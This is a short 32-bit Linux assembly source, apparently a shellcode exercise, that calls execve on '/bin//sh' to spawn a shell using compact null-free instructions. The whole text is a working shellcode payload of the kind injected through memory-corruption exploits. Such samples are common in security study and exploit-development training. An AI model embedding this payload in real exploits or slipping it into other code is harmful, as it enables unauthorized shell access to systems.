global _start
section .text

_start:
	; int execve(const char *filename, char *const argv[], char *const envp[])

	xor		ecx, ecx		; ecx = NULL
	mul		ecx			; eax and edx = NULL
	mov		al, 11		; execve syscall
	push		ecx			; string NULL
	push		0x68732f2f	; "//sh"
	push		0x6e69622f	; "/bin"
	mov		ebx, esp		; pointer to "/bin/sh\0" string
	int		0x80			; bingo
